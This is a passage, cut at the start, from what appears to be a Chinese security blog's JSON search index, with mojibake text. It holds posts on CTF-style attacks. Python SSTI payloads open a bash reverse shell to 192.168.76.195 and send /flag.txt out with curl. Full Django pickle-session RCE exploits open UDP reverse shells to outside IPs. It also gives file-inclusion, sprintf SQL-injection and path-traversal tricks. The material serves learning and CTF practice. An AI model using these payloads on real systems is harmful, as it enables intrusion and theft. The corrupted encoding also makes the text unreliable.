0&gt;&amp;1\\&apos;&quot;).read()&apos;)2.&apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&apos;__builtins__&apos;][&apos;eval&apos;](&apos;__import__(&quot;os&quot;).system(&quot;bash -c \\&apos;bash -i &amp;&gt;/dev/tcp/192.168.76.195/7777 0&gt;&amp;1\\&apos;&quot;)&apos;) æˆ–è€…å¯ä»¥è¿›è¡Œå¸¦å¤–æŠŠæ•°æ®å¸¦å‡ºæ¥: &#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).system(&quot;curl http://192.168.76.195:7777ï¼Ÿa=cat /flag.txt``â€)â€™)` å¦å¤–åå¼¹bash shellåœ¨python sstiä¸­è™½ç„¶å¯ä»¥å€ŸåŠ©å‘½ä»¤æ‰§è¡Œå¾ˆæ–¹ä¾¿ï¼Œ ä½†æ˜¯å¯ä»¥å°è¯•å…ˆå†™å…¥æ–‡ä»¶ï¼Œåœ¨æ‰§è¡Œæ–‡ä»¶å»åå¼¹ python shell: &#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;execfile&#39;](&#39;/home/alss/Desktop/testsys.py&#39;) æˆ–è€…å…¶ä»–æ‰§è¡Œæ–‡ä»¶çš„æ–¹æ³•","categories":[],"tags":[{"name":"éš¾åº¦ç®€å•çš„Python","slug":"éš¾åº¦ç®€å•çš„Python","permalink":"http://yoursite.com/tags/%E9%9A%BE%E5%BA%A6%E7%AE%80%E5%8D%95%E7%9A%84Python/"}]},{"title":"Djangoä½ç‰ˆæœ¬Rce","slug":"Djangoä½ç‰ˆæœ¬Rce","date":"2019-09-08T09:25:09.000Z","updated":"2019-09-08T09:34:00.000Z","comments":true,"path":"2019/09/08/Djangoä½ç‰ˆæœ¬Rce/","link":"","permalink":"http://yoursite.com/2019/09/08/Django%E4%BD%8E%E7%89%88%E6%9C%ACRce/","excerpt":"æ¼æ´åŸå› åŠç‰ˆæœ¬æ¼æ´äº§ç”Ÿæ˜¯å› ä¸ºdjango&lt;1.5(?)æ—¶ï¼Œé‡‡ç”¨çš„(å)åºåˆ—åŒ–çš„æ–¹æ³•æ˜¯cä¸­çš„pickleï¼Œå› è€Œå¯èƒ½äº§ç”Ÿrceï¼Œ","text":"æ¼æ´åŸå› åŠç‰ˆæœ¬æ¼æ´äº§ç”Ÿæ˜¯å› ä¸ºdjango&lt;1.5(?)æ—¶ï¼Œé‡‡ç”¨çš„(å)åºåˆ—åŒ–çš„æ–¹æ³•æ˜¯cä¸­çš„pickleï¼Œå› è€Œå¯èƒ½äº§ç”Ÿrceï¼Œ ä¸¾ä¾‹å±•ç¤ºpickleåºåˆ—åŒ–æ—¶çš„æ¼æ´å¦‚serialize.py 123456789101112131415161718192021222324252627282930313233343536373839import base64try:â€‹ import cPickle as pickleexcept:â€‹ import pickleclass id(object):â€‹ def __reduce__(self):â€‹ import subprocessâ€‹ return (subprocess.call,â€‹ ([&apos;python&apos;,â€‹ &apos;-c&apos;,â€‹ &apos;import socket,subprocess,os;&apos;â€‹ &apos;s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);&apos;â€‹ &apos;s.connect((&quot;62.234.128.237&quot;,7777));&apos;â€‹ &apos;os.dup2(s.fileno(),0);&apos;â€‹ &apos;os.dup2(s.fileno(),1);&apos;â€‹ &apos;os.dup2(s.fileno(),2);&apos;â€‹ &apos;subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos;],))sess=base64.b64encode(pickle.dumps(id()))print sess unserialize.py 12345678910111213import sysimport base64try:â€‹ import cPickle as pickleexcept:â€‹ import picklepickle.loads(base64.b64decode(sys.argv[1])) serialize.pyçš„ç»“æœç”¨unserialize.pyå»ååºåˆ—åŒ–æ—¶ä¼šæ‰§è¡Œ__reduce__æ–¹æ³•çš„å†…å®¹ï¼ˆè¿™é‡Œæ—¶åå¼¹udpçš„shellï¼‰ djangoä¸­ä½¿ç”¨djangoä¸­ä½¿ç”¨åªéœ€è¦çŸ¥é“ä¸¤ç‚¹ 1.secret_key 2.èƒ½å¤Ÿæ§åˆ¶sessionç­‰ä½¿ç”¨secret_keyåºåˆ—åŒ–åŠ å¯†çš„ä¸œè¥¿ï¼ˆæ¯”å¦‚sessionå­˜å‚¨åœ¨å®¢æˆ·ç«¯cookieæ—¶ï¼‰ ç”±äºdjangoæ²¡æœ‰æ·±å…¥å­¦ä¹ è¿‡ï¼Œå…ˆpoåˆ°è¿™é‡Œä¸€ä¸ªexp 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647# coding: utf-8from django.contrib.sessions.serializers import PickleSerializerfrom django.core import signingfrom django.conf import settingssettings.configure(SECRET_KEY=&apos;oa4$kkk802=rfm@tl^e5yb3qvs_ea3r!m*&amp;j+#_+s-9=xcieci&apos;)class GetShellWithPython(object):â€‹ def __reduce__(self):â€‹ import subprocessâ€‹ return (subprocess.call,â€‹ ([&apos;python&apos;,â€‹ &apos;-c&apos;,â€‹ &apos;import socket,subprocess,os;&apos;â€‹ &apos;s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);&apos;â€‹ &apos;s.connect((&quot;95.179.179.3&quot;,7777));&apos;â€‹ &apos;os.dup2(s.fileno(),0);&apos;â€‹ &apos;os.dup2(s.fileno(),1);&apos;â€‹ &apos;os.dup2(s.fileno(),2);&apos;â€‹ &apos;subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos;],))sess = signing.dumps(â€‹ obj=GetShellWithPython(),â€‹ serializer=PickleSerializer,â€‹ salt=&apos;django.contrib.sessions.backends.signed_cookies&apos;)print(sess)","categories":[],"tags":[{"name":"éš¾åº¦ç®€å•çš„Python","slug":"éš¾åº¦ç®€å•çš„Python","permalink":"http://yoursite.com/tags/%E9%9A%BE%E5%BA%A6%E7%AE%80%E5%8D%95%E7%9A%84Python/"}]},{"title":"æ–‡ä»¶åŒ…å«æ¼æ´çš„åˆ©ç”¨","slug":"æ–‡ä»¶åŒ…å«æ¼æ´çš„åˆ©ç”¨","date":"2019-09-08T09:10:33.000Z","updated":"2020-03-05T09:26:38.580Z","comments":true,"path":"2019/09/08/æ–‡ä»¶åŒ…å«æ¼æ´çš„åˆ©ç”¨/","link":"","permalink":"http://yoursite.com/2019/09/08/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8/","excerpt":"æ–‡ä»¶åŒ…å«","text":"æ–‡ä»¶åŒ…å« æ–‡ä»¶åŒ…å«ä¼ªåè®®ã€‚ã€‚ã€‚ æ–‡ä»¶åŒ…å«è‡ªå†™å…¥çš„æ–‡ä»¶åˆ©ç”¨sessionã€‚ã€‚ã€‚ åˆ©ç”¨æ—¥å¿—æ–‡ä»¶(é”™è¯¯è®¿é—®)ã€‚ã€‚ã€‚ æ–‡ä»¶è‡ªåŒ…å«åŠ postè¿™é‡Œåˆ©ç”¨PHPçš„postæ–‡ä»¶ç‰¹æ€§ï¼Œå½“æ–‡ä»¶è‡ªåŒ…å«çˆ†æ ˆåï¼Œä¸´æ—¶æ–‡ä»¶è¢«ä¿å­˜ä¸‹æ¥ phpinfoåŠ åŒ…å«è¿™ä¸ªæ˜¯åˆ©ç”¨ä¸Šä¼ æ–‡ä»¶æ—¶çš„ä¸´æ—¶æ–‡ä»¶ä¼šåœ¨phpinfoä¸­åŠ è½½(å½“ç„¶åŠ è½½å®Œä¼šè¢«åˆ é™¤),è¿™é‡Œåˆ©ç”¨è„šæœ¬å¿«é€Ÿå»åŒ…å«ä¸´æ—¶æ–‡ä»¶å¯ä»¥å»getshell","categories":[],"tags":[{"name":"æŠ€æœ¯è¾£é¸¡çš„PHP","slug":"æŠ€æœ¯è¾£é¸¡çš„PHP","permalink":"http://yoursite.com/tags/%E6%8A%80%E6%9C%AF%E8%BE%A3%E9%B8%A1%E7%9A%84PHP/"}]},{"title":"æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´","slug":"æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´","date":"2019-09-08T09:07:56.000Z","updated":"2019-09-08T09:45:00.000Z","comments":true,"path":"2019/09/08/æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´/","link":"","permalink":"http://yoursite.com/2019/09/08/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/","excerpt":"æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´","text":"æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ åŸç†åˆ©ç”¨çš„sprintfå‡½æ•°ï¼Œåœ¨sprintfå‡½æ•°çš„ä½¿ç”¨:sprintf(str,arg1,arg2â€¦),åˆ†åˆ«ç”¨argå»åŒ¹é…%sç­‰ç±»å‹ï¼Œå½“å…¶%åè·Ÿçš„å­—ç¬¦æ‰€è¡¨ç¤ºçš„ç±»å‹ä¸åŒ¹é…çš„æ—¶å€™ï¼Œä¼šè¢«æ›¿æ¢æˆç©ºç™½ã€‚å¦å¤–ä¸€ç‚¹æ˜¯ï¼Œå¦‚æœ%çš„æ•°é‡å¤šäºargä¸ªæ•°æ—¶ï¼Œå¯ä»¥ç”¨%+æ•°å­—+(\\)$å»æŒ‡å®šç”¨ç¬¬å‡ ä¸ªå‚æ•°åŒ¹é…ã€‚è€Œsprintfçš„åŒ¹é…åŸåˆ™å­˜åœ¨æ¼æ´ï¼ŒåŸå› å³ä¸º:å®ƒå¯¹%åé¢åŠ ä¸€ä¸ªå­—ç¬¦æ‰€è¡¨ç¤ºçš„ç±»å‹ä¸ç†è§£æ—¶æ¯”å¦‚%\\ï¼Œå®ƒä¼šè¢«æ›¿æ¢æˆç©ºã€‚ sqlæ³¨å…¥payload:admin%1$\\&#39;åˆ©ç”¨æ­¤å»é€ƒé€¸å‡º&#39;(addslashesç»•è¿‡?)","categories":[],"tags":[{"name":"ElseWeb","slug":"ElseWeb","permalink":"http://yoursite.com/tags/ElseWeb/"}]},{"title":"PHPAuditLog","slug":"PHPAuditLog","date":"2019-09-08T08:49:40.000Z","updated":"2019-09-08T09:22:40.000Z","comments":true,"path":"2019/09/08/PHPAuditLog/","link":"","permalink":"http://yoursite.com/2019/09/08/PHPAuditLog/","excerpt":"ä»£ç å®¡è®¡Trickincludeä¸è¿‡æ»¤è¿›è¡Œä»»æ„ç›®å½•è¯»å–payload:include(&#39;index.php/../flag.php&#39;)ï¼Œè¿™é‡Œè§£é‡Šä¸€ä¸‹:è¿™é‡Œåœ¨index.phpçš„åé¢åŠ /ä¼šè¢«è§£é‡Šæˆä¸€ä¸ªç›®å½•(è™½ç„¶ä¸å­˜åœ¨)ï¼Œç„¶åå†è¿›å…¥ä¸Šå±‚../ï¼Œæœ€åè¯»å–åˆ°flag.phpã€‚","text":"ä»£ç å®¡è®¡Trickincludeä¸è¿‡æ»¤è¿›è¡Œä»»æ„ç›®å½•è¯»å–payload:include(&#39;index.php/../flag.php&#39;)ï¼Œè¿™é‡Œè§£é‡Šä¸€ä¸‹:è¿™é‡Œåœ¨index.phpçš„åé¢åŠ /ä¼šè¢«è§£é‡Šæˆä¸€ä¸ªç›®å½•(è™½ç„¶ä¸å­˜åœ¨)ï¼Œç„¶åå†è¿›å…¥ä¸Šå±‚../ï¼Œæœ€åè¯»å–åˆ°flag.phpã€‚ file_put_contentsä¸æ•°ç»„å¯¹äºå†™å…¥å‡½æ•°ï¼Œä¸€èˆ¬æœ‰æ­£åˆ™å»åˆ¤æ–­å†™å…¥å†…å®¹æ˜¯å¦æ•æ„Ÿï¼Œè€Œå¯¹äºè¿™ç§æ–¹æ³•ç»“åˆfile_put_contentså‡½æ•°æ˜¯æ­£å¥½æ„æˆäº†æ¼æ´ï¼Œæ­£åˆ™æˆ‘ä»¬ä¸€èˆ¬å°è¯•æ•°ç»„å»ç»•è¿‡é™åˆ¶ï¼Œè€Œfile_put_contentså‡½æ•°ç‰¹åœ°å£°æ˜äº†å¯ä¼ å…¥ä¸€ä¸ªæ•°ç»„å‚æ•°ï¼Œå¯èƒ½å®Œç¾ç»•è¿‡ã€‚ 123456789&lt;?php$a=array(&apos;a&apos;,&apos;b&apos;,&apos;c&apos;);file_put_contents(&apos;./a.txt&apos;,$a);system(&apos;cat ./a.txt&apos;);?&gt;","categories":[],"tags":[{"name":"æŠ€æœ¯è¾£é¸¡çš„PHP","slug":"æŠ€æœ¯è¾£é¸¡çš„PHP","permalink":"http://yoursite.com/tags/%E6%8A%80%E6%9C%AF%E8%BE%A3%E9%B8%A1%E7%9A%84PHP/"}]}]}